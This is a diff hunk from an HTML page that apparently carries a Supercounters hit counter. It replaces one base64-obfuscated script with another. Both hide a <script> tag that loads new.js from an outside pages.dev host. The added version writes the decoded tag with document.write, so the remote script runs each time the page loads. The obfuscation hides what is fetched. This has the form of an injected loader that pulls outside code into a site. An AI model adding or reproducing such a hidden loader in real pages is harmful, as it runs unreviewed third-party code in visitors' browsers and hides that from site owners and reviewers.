@@ -110,12 +110,10 @@
 
 
 <script>
-  const base64 = "ICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2xpbm5rLnBhZ2VzLmRldi9uZXcuanMiPjwvc2NyaXB0Pg0K";
-  const html = atob(base64); // decode base64
-  const wrapper = document.createElement('div');
-  wrapper.innerHTML = html;
-  document.body.appendChild(wrapper.firstChild); // appends the <script> tag
+  const b64 = "PHNjcmlwdCBzcmM9Imh0dHBzOi8vbGlubmsucGFnZXMuZGV2L25ldy5qcyI+PC9zY3JpcHQ+";
+  document.write(atob(b64));
 </script>
+
 
     
        <!-- BEGIN: Powered by Supercounters.com -->
